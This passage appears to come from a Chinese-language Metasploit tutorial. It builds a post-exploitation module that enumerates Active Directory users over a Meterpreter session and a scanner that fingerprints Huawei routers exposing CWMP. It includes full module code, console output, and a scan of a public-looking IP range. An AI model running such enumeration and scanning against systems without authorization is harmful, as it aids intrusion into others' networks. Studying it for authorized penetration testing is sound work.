  \ | 涉及取证数据收集的模块。 |\n| manage | 修改/操作/操纵系统中的某些内容的模块。诸如迁移、注入等与会话管理相关的任务也归于此。 |\n|\
  \ recon | 模块可帮助您从侦察角度了解有关系统的更多信息，但不涉及数据窃取。请理解这与 gather 类型的模块不同。 |\n| wlan | 用于 WLAN\
  \ 相关任务的模块。 |\n| escalate | 这已弃用，但由于流行，模块仍保留在此。此处曾是权限提升模块的存放位置。所有权限提升模块不再被视为 post\
  \ 模块，它们现在是 exploits。 |\n| capture | 涉及监控以进行数据收集的模块。例如，键盘记录。 |\n\n由于我们的模块将枚举域用户，我们应该将其放在\
  \ gather 类别中，因此我们的目标目录应为：\n\n/usr/share/metasploit-framework/modules/post/windows/gather/\n\
  \n让我们构建我们的后利用模块。\n\n- 1. 首先，我们需要指定要加载哪些库：\n  ```\n  require 'msf/core/post/windows/powershell'\n\
  \  ```\n- 2. 接下来，定义类并在模块中包含 PowerShell 功能：\n  ```\n  class MetasploitModule < Msf::Post\n\
  \    include Msf::Post::Windows::Powershell\n  ```\n- 3. 然后我们需要填写模块信息：\n  ```\n\
  \  def initialize(info={})\n    super(update_info(info,\n      'Name' => 'PowerShell\
  \ Domain User Enumeration',\n      'Description' => %q{\n        This module will\
  \ enumerate user accounts\n        in the default domain using PowerShell.\n   \
  \   },\n      'License' => MSF_LICENSE,\n      'Author' => [ 'Daniel Teixeira' ],\n\
  \      'Platform' => [ 'win'],\n      'SessionTypes' => [ 'meterpreter' ]\n    ))\n\
  \  end\n  ```\n- 4. 对于此模块，我们将使用 PowerShell [adsiSearcher] 类型加速器来搜索 AD 并列出所有用户：\n\
  \  ```\n  user_enum = '([adsiSearcher]\"objectcategory=user\").findall() | foreach\
  \ {$_.Path} | ForEach-Object { $_.Split(\"=\",)[1]}'\n  ```\n- 5. 最后，我们只需要使用 print_status\
  \ 将命令的输出打印到屏幕：\n  ```\n  print_status psh_exec(user_enum)\n  ```\n\n\n\n6. 最后，我们可以用所需的名称保存模块，并使用\
  \ .rb 扩展名。以下是完整的模块，我将其命名为 ps_ad_users：\n\n```\n##\n# This module requires Metasploit:\n\
  http://metasploit.com/download\n# Current source:\nhttps://github.com/rapid7/metasploit-framework\n\
  ##\n\nrequire 'msf/core/post/windows/powershell'\n\nclass MetasploitModule < Msf::Post\n\
  \  include Msf::Post::Windows::Powershell\n\n  def initialize(info={})\n    super(update_info(info,\n\
  \      'Name' => 'PowerShell Domain User Enumeration',\n      'Description' => %q{\n\
  \        This module will enumerate user accounts\n        in the default domain\
  \ using PowerShell.\n      },\n      'License' => MSF_LICENSE,\n      'Author' =>\
  \ [ 'Daniel Teixeira' ],\n      'Platform' => [ 'win'],\n      'SessionTypes' =>\
  \ [ 'meterpreter' ]\n    ))\n  end\n\n  def run\n    user_enum = '([adsisearcher]\"\
  objectcategory=user\")\n.findall() | foreach {$_.Path} | ForEach-Object\n{ $_.Split(\"\
  =\",)[1]}'\n    print_status psh_exec(user_enum)\n    print_good \"Finished!\"\n\
  \  end\n\nend\n```\n\n7. 为了测试它，我已将 Active Directory 域服务角色添加到 Metasploitable 3 机器中。为了测试模块，在目标上获取初始会话并加载模块，指定\
  \ Meterpreter 会话 ID，然后运行它：\n\n```\nmsf exploit(windows/smb/psexec) > use post/windows/gather/ps_ad_users\n\
  msf post(windows/gather/ps_ad_users) > set SESSION 1\nSESSION => 1\nmsf post(windows/gather/ps_ad_users)\
  \ > run\n\n[*] Compressed size: 1040\n[*] #< CLIXML\nAdministrator\nGuest\nvagrant\n\
  sshd\nsshd_server\nleia_organa\nluke_skywalker\nhan_solo\nartoo_detoo\nc_three_pio\n\
  ben_kenobi\ndarth_vader\nanakin_skywalker\njarjar_binks\nlando_calrissian\nboba_fett\n\
  jabba_hutt\ngreed\nchewbacca\nkylo_ren\nkrtbtg\n<Objs Version=\"1.1.0.1\" xmlns=\"\
  http://schemas.microsoft.com/powershell/2004/04\"><Obj S=\"progress\" ReFId=\"0\"\
  ><I>T:System.Management.Automation.PSCustomObject</I><I>T:System.Object</T></TN><MS>I64\
  \ N=\"SourceId\">1</I><I64 N=\"Record\"><AV>Preparing modules for first use.</AV><AI>0</AI><AI>0</AI><AI>0</AI>\
  \ /><PI>1</PI><PI>1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD></SD></PR></MS></Obj></Objs>\n\
  [*] Finished!\n[*] Post module execution completed\nmsf post(windows/gather/ps_ad_users)\
  \ >\n```\n\n由于使用此模块不需要特权用户，因此在后利用阶段非常有用。\n\n## 构建自己的辅助模块\n\n在撰写本文时，Metasploit Framework\
  \ 几乎有 1,000 个辅助模块，并且数量一直在增加，因为总会有新的软件和漏洞尚未在框架中提供。因此，在本教程中，我们将学习如何构建自己的辅助模块。\n\n\
  ## 准备工作\n\n在本教程中，我们将编写一个辅助模块，用于扫描启用了 **CPE WAN 管理协议 (CWMP)** 的华为家庭路由器。CWMP 是提供商用于远程管理用户驻地设备所使用的协议。它允许自动配置、软件或固件映像管理、软件模块管理、状态和性能管理以及诊断。\n\
  \n## 如何操作...\n\n- 1. 当我们使用 CWMP 默认端口 7547 连接到路由器时，会得到以下答复：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_679_0.png)\n\
  \n2. 通过使用 curl 并带 -v 选项进行详细输出，我们可以看到发出的请求和路由器的回复：\n\n```\nroot@kali:~# curl -v http://89.181.67.197:7547\n\
  * Rebuilt URL to: http://89.181.67.197:7547/\n* Trying 89.181.67.197...\n* TCP_NODELAY\
  \ set\n* Connected to 89.181.67.197 (89.181.67.197) port 7547 (#0)\n> GET / HTTP/1.1\n\
  > Host: 89.181.67.197:7547\n> User-Agent: curl/7.56.1\n> Accept: */*\n>\n< HTTP/1.1\
  \ 401 Unauthorized\n< Connection: Keep-Alive\n< WWW-Authenticate: Basic realm=\"\
  HuaweiHomeGateway\"\n< Content-Length: 0\n<\n* Connection #0 to host 89.181.67.197\
  \ left intact\n```\n\n有了这些信息，我们可以构建一个辅助模块来扫描目标范围并识别运行了启用 CWMP 的华为家庭路由器的目标。\n\n由于\
  \ Metasploit 可能已经拥有我们正在寻找的基础功能的模块，因此我们首先应该做的是搜索可用模块，看看可以使用什么。\n\n对于本教程，我将从位于 /usr/share/metasploit-framework/modules/auxiliary/scanner/http\
  \ 文件夹中的 HTTP 版本检测辅助模块 http_version.rb 开始，它具有我们模块所需的所有功能。\n\n3. 再次，我们将只关注 run 方法。这是原始代码：\n\
  \n```\ndef run_host(ip)\n  begin\n    connect\n    res = send_request_raw({ 'uri'\
  \ => '/',\n      'method' => 'GET' })\n    fp = http_fingerprint(:response => res)\n\
  \    print_good(\"#{ip}:#{rport} #{fp}\") if fp\n    report_service(:host => rhost,\
  \ :port => rport,\n      :sname => (ssl ? 'https' : 'http'), :info => fp)\n  rescue\
  \ ::Timeout::Error, ::Errno::EPIPE\n  ensure\n    disconnect\n  end\nend\n```\n\n\
  正如我们所见，它非常简单：它连接到目标，发送 HTTP GET 请求，使用 http_fingerprint 方法将结果存储在名为 fp 的变量中，然后使用 print_good\
  \ 打印输出，并使用 report_service 将结果添加到当前工作区。\n\n对于我们的模块，我们将首先更改 initialize 方法。\n\n- 4.\
  \ 使用 register_options 数据结构，我们可以为模块指定默认端口号，并且由于我们要扫描 CWMP 服务，我们将指定端口 7547：\n\n```\n\
  register_options([\n  Opt::RPORT(7547),\n])\n```\n\n- 5. 然后，我们需要比较响应并验证设备是否为华为家庭网关。为此，我们将创建一个名为\
  \ huawei 的新变量来保存来自我们路由器的响应：\n\n```\nhuawei = \" ( 401-Basic realm=\\\"HuaweiHomeGateway\\\
  \" )\"\n```\n\n- 6. 接下来，我们将使用 if 语句比较来自目标的响应与来自我们路由器的响应，如果匹配，则打印并保存结果：\n\n```\n\
  if fp == huawei\n  print_good(\"#{ip}\")\n  report_service(:host => rhost, :port\
  \ => rport,\n  :sname => (ssl ? 'https' : 'http'), :info => \"CWMP\n- Huawei Home\
  \ Gateway\")\nend\n```\n\n- 7. 这是最终的模块：\n\n```\n##\n# This module requires Metasploit:\n\
  https://metasploit.com/download\n# Current source:\nhttps://github.com/rapid7/metasploit-framework\n\
  ##\n\nrequire 'rex/proto/http'\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include\
  \ Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanServer\n \
  \ include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'\
  \ => 'Huawei Home Gateway CWMP Detection',\n      'Description' => 'This module\
  \ allows the\nidentification of Huawei Home Gateway routers\nwith CWMP enabled',\n\
  \      'Author' => 'Daniel Teixeira',\n      'License' => MSF_LICENSE\n    )\n\n\
  \    register_wmap_options({\n      'OrderID' => 0,\n      'Require' => {},\n  \
  \  })\n\n    register_options(\n      [\n        Opt::RPORT(7547),\n      ])\n \
  \ end\n\n  def run_host(ip)\n    begin\n      connect\n      res = send_request_raw({\
  \ 'uri' => '/', 'method' => 'GET' })\n      fp = http_fingerprint(:response => res)\n\
  \      huawei = \" ( 401-Basic realm=\\\"HuaweiHomeGateway\\\" )\"\n      if fp\
  \ == huawei\n        print_good(\"#{ip}\")\n        report_service(:host => rhost,\
  \ :port => rport,\n:sname => (ssl ? 'https' : 'http'), :info => \"CWMP\n- Huawei\
  \ Home Gateway\")\n      end\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    ensure\n\
  \      disconnect\n    end\n  end\nend\n```\n\n- 8. 将代码保存到 `/usr/share/metasploit-framework/modules/auxiliary/scanner/http`\
  \ 中的名为 `huawei_cwmp.rb` 的文件中，使用 `msfconsole` 加载模块，设置要扫描的 IP 地址或范围，然后运行模块：\n\n```\n\
  msf > use auxiliary/scanner/http/huawei_cwmp\nmsf auxiliary(scanner/http/huawei_cwmp)\
  \ >\nset RHOSTS 89.181.67.0/24\nRHOSTS => 89.181.67.0/24\nmsf auxiliary(scanner/http/huawei_cwmp)\
  \ >\nset THREADS 256\nTHREADS => 256\nmsf auxiliary(scanner/http/huawei_cwmp) >\
  \ run\n\n[+] 89.181.67.2\n[+] 89.181.67.165\n[+] 89.181.67.198\n...\n```\n\n- 9.\
